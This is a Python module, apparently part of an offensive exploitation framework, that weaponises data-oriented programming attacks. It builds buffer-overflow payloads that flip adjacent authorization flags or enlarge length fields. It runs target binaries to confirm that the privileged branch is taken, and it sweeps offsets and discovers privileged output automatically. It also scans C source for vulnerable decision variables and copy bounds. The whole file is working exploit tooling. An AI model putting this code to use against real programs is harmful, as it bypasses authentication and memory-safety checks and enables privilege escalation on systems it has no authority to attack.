"""Data-Oriented Programming (DOP) weaponization -- reach impact by corrupting DATA, not control flow.

Every control-flow L3 lykos has (ret2win/ret2libc/ret2csu/SROP/ret2dlresolve/FSOP/leak->groom) hijacks
the instruction pointer. That whole family is defeated by CFI, and it is inapplicable when a write
primitive cannot reach a code pointer at all. DOP is the orthogonal paradigm (Hu et al., S&P'16;
FlowStitch, USENIX'15): overwrite a SECURITY-DECISION variable -- an `is_admin` / `authenticated` /
`allow` flag, a bounds field, a path/command buffer -- so the program's OWN code, running normally,
takes a privileged path. No gadget, no leak, CFI-immune. The effect is a real attacker objective
(privilege gained, a guarded action performed), demonstrated by the program's own observable
behaviour rather than a spawned shell.

This module is the planner + a FORGERY-PROOF differential oracle for the most fundamental DOP
primitive: a linear write that reaches an adjacent decision variable and flips it. `plan_flag_flip`
lowers the write to bytes; `detonate_data_only` confirms the privileged path is taken AND that a
benign (non-overflowing) input does NOT take it -- so a program that prints the marker on its own, or
reaches the branch without our write, is rejected. Pure + deterministic; the oracle runs the target.
"""
from __future__ import annotations

import subprocess
from dataclasses import dataclass
from typing import Optional


@dataclass
class FlagFlipPlan:
    distance: int          # bytes from the overflow buffer's start to the decision variable
    flip: bytes            # the value written over the variable (truthy -> privileged path)
    payload: bytes         # fill-to-distance + flip
    negative: bytes        # fill up to -- but not into -- the variable (must NOT take the branch)


def plan_flag_flip(distance: int, *, flip: bytes = b"\x01", fill: bytes = b"A") -> FlagFlipPlan:
    """Lower a data-only flag flip: overflow `distance` bytes to reach a decision variable, then
    write `flip` over it (default 0x01 -> a truthy flag). The negative control fills right up to the
    variable without touching it, so if it still takes the privileged path the write was not what
    caused it."""
    if distance < 0:
        raise ValueError("distance must be non-negative")
    pad = (fill * distance)[:distance]
    return FlagFlipPlan(distance=distance, flip=flip, payload=pad + flip, negative=pad)


def _run(exe: str, data: bytes, *, input_mode: str, argv, timeout: float) -> bytes:
    """Run the target once with `data` and return stdout+stderr. Never raises."""
    try:
        a = list(argv or [])
        if input_mode == "arg":
            a = a + [data.decode("latin-1")]
            r = subprocess.run([exe] + a, capture_output=True, timeout=timeout)
        else:
            r = subprocess.run([exe] + a, input=data, capture_output=True, timeout=timeout)
        return (r.stdout or b"") + (r.stderr or b"")
    except Exception:                                        # noqa: BLE001
        return b""


def detonate_data_only(exe: str, plan: FlagFlipPlan, *, marker: bytes, input_mode: str = "stdin",
                       argv: Optional[list] = None, timeout: float = 8.0) -> bool:
    """Confirm a DOP flag-flip: the overflow makes the program emit `marker` (its privileged path's
    observable effect) AND the negative control (same input, one byte short of the variable) does
    NOT. Sound and forgery-proof against a target that prints the marker unconditionally or reaches
    the privileged branch without our write: both would make the negative control emit it too, which
    rejects the result. `marker` must be output the BENIGN path cannot produce (the guarded action's
    own signal). Returns True only when the write is the cause."""
    if not marker:
        return False
    pos = _run(exe, plan.payload, input_mode=input_mode, argv=argv, timeout=timeout)
    if marker not in pos:
        return False
    neg = _run(exe, plan.negative, input_mode=input_mode, argv=argv, timeout=timeout)
    return marker not in neg


def sweep_flag_flip(exe: str, *, marker: bytes, max_distance: int = 256, input_mode: str = "stdin",
                    argv: Optional[list] = None, flip: bytes = b"\x01",
                    timeout: float = 8.0) -> Optional[FlagFlipPlan]:
    """When the exact buffer->variable distance is not known statically, sweep candidate distances
    and return the first plan the sound oracle confirms (a wrong distance either misses the variable
    or corrupts something that does not take the branch -> the oracle rejects it). Bounded."""
    for d in range(1, max_distance + 1):
        plan = plan_flag_flip(d, flip=flip)
        if detonate_data_only(exe, plan, marker=marker, input_mode=input_mode, argv=argv,
                              timeout=timeout):
            return plan
    return None


# ---- source-side DOP target discovery -----------------------------------------------------------
import re as _re

#: a variable name that reads as a security DECISION (the thing a DOP write flips).
_DECISION_VAR = _re.compile(r"(?:^|[^A-Za-z])(is_?auth\w*|authed|authenticated|is_?admin|admin|"
                            r"is_?root|allow\w*|permit\w*|granted?|access|priv\w*|role|verified|"
                            r"logged_?in|bypass|trusted)(?:[^A-Za-z]|$)", _re.I)
#: a guarded privileged action inside the taken branch. Keywords are bounded by non-LETTERS (not \b)
#: so they match inside identifiers like send_secret / grant_access / do_admin.
_PRIV_ACTION = _re.compile(r"(?<![a-zA-Z])(system|exec|popen|setuid|setgid|seteuid|sprintf|strcpy|"
                           r"send|recv|fopen|unlink|admin|root|grant|secret|flag|privile|shell|"
                           r"passwd|token)(?![a-zA-Z])", _re.I)


#: a size/length/count variable that bounds a copy or loop -- a write that enlarges it overflows.
_BOUND_VAR = _re.compile(r"(?:^|[^A-Za-z_])(len|length|size|count|num|n|nbytes|cb|cch|total|cap|"
                         r"capacity|limit|max|datalen|buflen)(?:[^A-Za-z]|$)", _re.I)
_COPY_SINK = _re.compile(r"\b(memcpy|memmove|memset|copy|read|recv|strncpy|strncat|while|for)\b")


def find_dop_bounds(src: str):
    """Bounds/length DOP targets: a STORED size/length field used as a copy or loop bound that a
    data-only write could enlarge to force an out-of-bounds access -- the data-only analogue of an
    integer bug (no control-flow hijack, the program's own copy runs with a corrupted length). We
    require the bound to be a STRUCT FIELD (corruptible in memory, not a fresh local) used in a
    copy/loop context. Returns [{var, line, hint}]."""
    out = []
    lines = src.splitlines()
    for i, ln in enumerate(lines):
        if not _COPY_SINK.search(ln):
            continue
        # a struct-field length operand in the copy/loop: base->len / base.size
        for m in _re.finditer(r"\b([A-Za-z_]\w*(?:->|\.)[A-Za-z_]\w*)", ln):
            field = m.group(1)
            leaf = _re.split(r"->|\.", field)[-1]
            if _BOUND_VAR.search(leaf):
                out.append({"var": field, "line": i + 1, "hint": ln.strip()[:90]})
                break
    seen, uniq = set(), []
    for d in out:
        k = (d["var"], d["line"])
        if k not in seen:
            seen.add(k); uniq.append(d)
    return uniq


def stitch_plan(write_desc: str, target: dict) -> dict:
    """FlowStitch-style data-only chain: compose a WRITE primitive with a discovered DOP target into
    one ordered plan -- stitch the write's reachable address to the target variable, so driving the
    write corrupts exactly that decision/bound and the program's own code produces the impact. Pure;
    `target` is a find_dop_targets/find_dop_bounds entry plus a 'kind' (auth|bounds|buffer)."""
    kind = target.get("kind", "auth")
    var = target.get("var", "<var>")
    if kind == "bounds":
        effect = f"enlarge '{var}' -> the guarded copy/loop runs out of bounds (data-only overflow)"
        value = "a large value (> the real buffer size)"
    elif kind == "buffer":
        effect = f"fill '{var}' with attacker bytes -> the sink consumes them (data-only injection)"
        value = "the attacker payload"
    else:
        effect = f"flip '{var}' truthy -> the program takes the privileged branch (data-only auth)"
        value = "a non-zero value"
    return {"ttp": "flowstitch-data-only", "kind": kind, "target_var": var,
            "steps": [f"drive the write primitive ({write_desc}) to reach &{var}",
                      f"write {value} over '{var}'",
                      f"let the program's own code run: {effect}"],
            "note": "no control-flow hijack, CFI-immune; the impact is the program taking its own "
                    "guarded path with a corrupted decision/bound (FlowStitch, USENIX'15)."}


def find_dop_targets(src: str):
    """Source-side DOP discovery: a SECURITY-DECISION variable whose value chooses between a guarded
    (privileged) path and a denied one -- the thing a memory write flips in a data-only attack. We
    flag `if (<decision-var>) { ...privileged... }` (and `if (!..) return;`-style gates) where the
    variable name reads as an authorization decision and the guarded block contains a privileged
    action. Returns [{var, line, hint}]. Pairs with a write primitive: the attack-path WRITE->AUTH
    DOP edge is realised by overwriting one of these. Pure/static."""
    out = []
    lines = src.splitlines()
    for i, ln in enumerate(lines):
        m = _re.search(r"\bif\s*\(\s*(!?\s*[A-Za-z_][\w.\->]*)\s*\)", ln)
        if not m:
            continue
        cond = m.group(1)
        dv = _DECISION_VAR.search(cond)
        if not dv:
            continue
        # look at the guarded block (this line's tail + the next few lines) for a privileged action.
        window = " ".join(lines[i:i + 6])
        if _PRIV_ACTION.search(window):
            var = dv.group(1)
            out.append({"var": var, "line": i + 1, "hint": ln.strip()[:90]})
    # dedup by (var, line)
    seen, uniq = set(), []
    for d in out:
        k = (d["var"], d["line"])
        if k not in seen:
            seen.add(k); uniq.append(d)
    return uniq

#: a printable token (>=4 chars) that could be a privileged-path signal.
_TOKEN = _re.compile(rb"[\x20-\x7e]{4,}")


def _tokens(out: bytes) -> set:
    return set(_TOKEN.findall(out or b""))


def discover_data_only(exe: str, *, benign: bytes = b"a\n", max_distance: int = 256,
                       input_mode: str = "stdin", argv: Optional[list] = None,
                       flip: bytes = b"\x01", timeout: float = 8.0):
    """Fully hands-off DOP: DISCOVER both the privileged signal and the buffer->variable distance.
    No marker is supplied. The privileged path is whatever stable, printable output the overflow
    makes appear that a BENIGN run does not -- so we diff against the benign baseline rather than
    knowing the secret in advance. Soundness is preserved: a candidate token must (1) appear under
    the full overflow, (2) be absent from the benign baseline, (3) be absent from the negative
    control (the same overflow one byte short of the variable -> not our write), and (4) reproduce
    on a second overflow run (reject one-off corruption garbage). Returns (FlagFlipPlan, token) or
    (None, None). Bounded by max_distance.

    This turns the data-only chain hands-off: the earlier detonate_data_only needs the caller to
    name the privileged marker; here the engine finds it, which is what lets DOP fire on a target
    whose guarded output we do not know up front."""
    base = _tokens(_run(exe, benign, input_mode=input_mode, argv=argv, timeout=timeout))
    for d in range(1, max_distance + 1):
        plan = plan_flag_flip(d, flip=flip)
        pos = _tokens(_run(exe, plan.payload, input_mode=input_mode, argv=argv, timeout=timeout))
        cand = pos - base
        if not cand:
            continue
        neg = _tokens(_run(exe, plan.negative, input_mode=input_mode, argv=argv, timeout=timeout))
        pos2 = _tokens(_run(exe, plan.payload, input_mode=input_mode, argv=argv, timeout=timeout))
        for tok in sorted(cand - neg):
            if tok in pos2:                              # stable across runs, caused by our write
                return plan, tok
    return None, None
